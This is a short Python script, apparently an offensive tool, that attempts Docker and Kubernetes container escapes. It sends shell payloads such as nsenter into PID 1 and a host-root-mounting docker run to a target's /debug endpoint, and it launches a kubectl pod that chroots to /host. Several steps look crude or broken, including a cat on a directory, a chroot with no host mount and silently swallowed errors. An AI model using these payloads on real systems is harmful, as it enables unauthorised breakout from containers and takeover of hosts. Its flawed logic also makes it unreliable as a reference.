import requests
import subprocess

def docker_escape(target):
    """Docker container escape"""
    payloads = [
        
        "mount -t proc proc /host/proc && cat /host/proc/1/root",
        
        "nsenter -t 1 -m -u -i -n -p sh",
        
        "docker run -v /:/host ubuntu chroot /host sh"
    ]
    
    for payload in payloads:
        print(f"[+] Trying Docker escape: {payload[:50]}...")
        
        try:
            requests.post(f"http://{target}/debug", data={"cmd": payload}, timeout=5)
        except:
            pass

def k8s_escape(target):
    """Kubernetes escape"""
    print("[+] Kubernetes escape chain...")
    subprocess.run(["kubectl", "run", "escape", "--image=busybox", "--rm", "-it", "--", "chroot", "/host"])

def run_jailbreak(target):
    docker_escape(target)
    k8s_escape(target)